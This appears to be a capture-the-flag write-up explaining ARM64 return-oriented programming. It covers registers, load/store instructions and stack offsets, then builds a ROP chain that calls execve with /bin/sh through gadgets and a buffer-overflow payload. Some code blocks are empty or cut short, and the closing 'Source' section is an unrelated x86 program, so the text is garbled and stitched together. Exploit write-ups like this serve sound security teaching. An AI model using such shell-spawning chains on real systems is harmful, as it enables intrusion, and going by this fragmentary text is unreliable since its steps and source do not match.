Basically all the text is explaining how ARM ROP works. I'll try and summarise it    
```c
	puts("In ARM, there are a total of 31 general-purpose 64-bit registers (X0-X30)");
	puts("");
	puts("	X0-X5: Argument registers");
	puts("	X8:    The syscall number");
	puts("	X29:   The stack base pointer");
	puts("	X30:   The return address");
	puts("	sp:    The stack pointer"); // this is x13
	puts("	pc:    The program counter"); //this is x15
  // theres also the Link register (LR) at x14 which stores return address from subroutine
```
This is one of the most important parts, as registers are the backbone of a program's execution. For now, just take note of what each one is for.  
#### ARM 64 instructions  
Here are some important instructions that you need to know.   
(x0 and x1 are placeholder registers)  
1. `str x0, [x1]` (store register)  
- stores value at x0 at address in x1  
2. `ldr x0, [sp, #8]` (load register)
- loads the value at sp+0x08 into x0
3. `ldp x0, x1, [sp, #0x10]` (load pair of registers)  
- loads the value from sp+0x10 into x0, and sp+0x18 into x1.  
- 0x10 here is the offset from sp, if left empty it will default to 0.    
4. `ldp x0, x1, [sp], #0x40`  / `ldr x0, [sp], #16`
- similar to the previous one, but here sp is explicitly incremented  
- loads the value from sp into x0 and sp+8 into x1, increments sp by 0x40 
- loads value from sp into x0, increments sp by 16
5. `mov x0, x1`
- copies x1 into x0
6. `add x0,x0,x1` / `add sp,sp, #0x10`
- basically x0 = x0 + x1 
- sp = sp + 0x10 (advances sp by 0x10)
7. `svc #0` (supervisor call/syscall)
- Performs a syscall
- the value in x8 is used as the syscall number
- the values from x0-x5 are used as the arguments
- so to call a shell you need x8=221,x0=/bin/sh,x1=0,x2=0
8. `ret`
- returns/jumps to the address in x30
- Unlike x86 systems, `ret` in x64 does not pop return address at rsp.  
9. `br x16`
- similar to ret but the address to jump to is specified
- in this case, jump to address at x16  
   
*Actually, you can also specify the register to jump to for a `ret` instruction (default is x30). The difference is that the `ret` instruction hints that the program is performing a subroutine return whereas `br` hints that is is NOT a subroutine return.  
**A subroutine return is when execution goes back to where the function was initially called from.    
Theres other instructions but I dont think you will need them for this challenge. I also found [this](https://www.cs.swarthmore.edu/~kwebb/cs31/resources/ARM64_Cheat_Sheet.pdf) which looks useful but idk theres so many resources online just find one that you like i guess.  

ALSO, it is very very important to keep track of what offsets were added to sp!  
As mentioned in the source:  
```c
puts("Notice that keeping track of what offsets are added to sp at the end are very important!"); 
```
The reason is that usually on x86_64 systems, when programs execute pop/push commands on the stack, they automatically increment or decrement the stack pointer (specifically pop,push and ret incre/decre by 8).  HOWEVER, on aarch64, instructions behave differently. Operation such as `ldr` for loading registers do not always increment sp. Also as mentioned above theres that behaviour with `ret` where the return address of sp is not popped.  
And so, it is very imporant to keep track of your offsets when performing ROP.

```python
g3 = 0x0000000000442990
#mov x8, x6; svc #0; ret;

g4 = 0x000000000041112c
```

Also I forgot to mention that `Wn` registers just refer to the lower 32 bits of the `Xn` registers.  
TLDR,  
- g1 store x0,x1  
- g2 load x0,x1  
- g3 is syscall, x6 is copied to x8  
- g4 sets x2=0  

I formualted the following plan for my ROP chain:  
0. g4 set x2=0
1. g2 load x0,x1 - load x1 as writeable address, x0 as /bin/sh. 
2. g1 store x0,x1 - store /bin/sh at bss (address at x1)
3. g2 load x0,x1 - load x0=0 and x1=0, set x6=221
4. g3 syscall with 221, mov x6 to x8

In main, sp is first decremented by 32, value at sp-32 is stored in x29, and sp-24 is stored in x30 (main return address).  
```bash

sp-8  
sp-16  
sp-24  
sp-32 - stored in x29
```
buf is then called and the same instruction ` stp     x29, x30, [sp, #-32]!` is run.  
read(0,sp+16,0x300) is then called.   
```bash
sp-0  

sp-0x08  #padding here
sp-0x10  #padding here
sp-0x18 - x30 #main, ovewrite this
sp-0x20 - x29 #main

sp-0x28
sp-0x30 - buffer starts here #new sp + 0x10
sp-0x38 - x30 #buf
sp-0x40 - x29 #new sp in buf is here
```
Because we are given a read of 0x300 bytes, we can easily overwrite the return address for main at sp-0x18 with our gadget!  
```python
payload  = b"A" * 24
payload += p64(g4)
payload += p64(0) # padding
payload += p64(0)  # padding (cus rmb previously sp was decremented in main)
```
A debugging trick that you can use is to make the return address point back to `main`.  This is just to prove that the chain is working up to that point.  
##### 1. use g4 to set x2=0
```python
#mov x2, #0; mov x3, #8; mov x8, #0x87; svc #0; ldp x29, x30, [sp], #0x20; ret;

```
##### 2. use g2 to load bss address into x1 and /bin/sh into x0

```python

# next gadget to return to x16 (at sp 0x08) (0x08-0x10)
```

#### Source
```C
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

void e() {
	_exit(0);
}	

int main() {
	char local[0x100];
	memset(local, 0, sizeof(local));
	void (*func)() = e;
	read(0, local, 0x110);
	__asm__("jmp *%0" :: "r"(func));
	return 0;
}
```
A very short program, we have a buffer overflow of 8 bytes
